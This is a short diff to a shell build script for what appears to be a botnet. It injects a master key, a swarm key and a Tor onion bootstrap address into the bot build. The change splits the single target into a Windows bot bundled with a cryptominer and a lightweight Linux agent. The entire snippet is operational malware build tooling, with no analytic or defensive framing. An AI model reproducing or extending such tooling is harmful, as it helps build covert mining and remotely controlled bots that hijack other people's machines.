@@ -40,11 +40,14 @@ SWARM_KEY=$(cat "$SWARM_KEY_PATH")
 # Define Bootstrap Address (Placeholder for now, in prod this comes from config)
 BOOTSTRAP_ONION="boot_mock_v3_placeholder_for_compiler_verification.onion:80"
 
-echo "[3] Building Node (Bot) with Injected Keys..."
+echo "[3] Building Windows Bot (Start + Miner)..."
 export MASTER_PUB_KEY="$PUB_KEY"
 export SWARM_KEY="$SWARM_KEY"
 export BOOTSTRAP_ONION="$BOOTSTRAP_ONION"
-cargo build --release --bin bot -p bot
+cargo build --release --bin bot_windows -p bot_windows
+
+echo "[4] Building Linux Bot (Lite Agent)..."
+cargo build --release --bin bot_linux -p bot_linux
 
 echo "[OK] Build Complete."
 echo " -> Master Key: $KEY_PATH (KEEP PRIVATE)"
